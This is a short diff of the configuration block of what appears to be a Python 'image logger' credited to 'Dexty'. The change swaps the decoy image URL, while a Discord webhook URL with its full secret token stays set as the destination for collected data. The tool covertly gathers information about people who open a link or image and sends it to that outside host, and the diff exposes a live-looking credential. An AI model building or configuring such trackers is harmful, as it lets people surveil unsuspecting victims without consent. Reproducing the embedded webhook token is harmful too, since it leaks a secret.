@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1365429765275783188/yFLI5xu8jyXYfBJ4mp3K8o_4r7q1IkxXRT5av3QeEnB6eTcnyNjrcQYYks3hIipRKQ45",
-    "image": "https://bluemoji.io/cdn-proxy/646218c67da47160c64a84d5/64fae94caff88aa302cfd957_92.png", # You can also have a custom image by using a URL argument
+    "image": "https://i.gifer.com/VjMO.gif", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
